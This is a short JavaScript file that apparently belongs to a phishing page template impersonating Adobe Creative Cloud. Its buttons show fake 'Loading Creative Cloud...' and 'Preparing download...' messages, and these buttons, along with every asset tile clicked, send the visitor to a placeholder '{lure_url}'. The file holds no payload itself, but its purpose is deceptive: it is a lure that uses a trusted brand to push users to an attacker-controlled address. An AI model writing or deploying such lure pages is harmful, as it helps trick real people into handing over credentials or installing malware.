function openInCreative() {
    const btn = document.querySelector('.btn-open-creative');
    btn.innerHTML = '<span>Loading Creative Cloud...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 2000);
}

function downloadAssets() {
    const btn = document.querySelector('.btn-download');
    btn.innerHTML = '<span>Preparing download...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1500);
}

document.querySelectorAll('.asset-item').forEach(item => {
    item.addEventListener('click', () => {
        window.location.href = '{lure_url}';
    });
});

document.addEventListener('DOMContentLoaded', () => {
    const items = document.querySelectorAll('.asset-item');
    items.forEach((item, index) => {
        item.style.opacity = '0';
        item.style.transform = 'scale(0.9)';
        setTimeout(() => {
            item.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
            item.style.opacity = '1';
            item.style.transform = 'scale(1)';
        }, index * 100);
    });
});
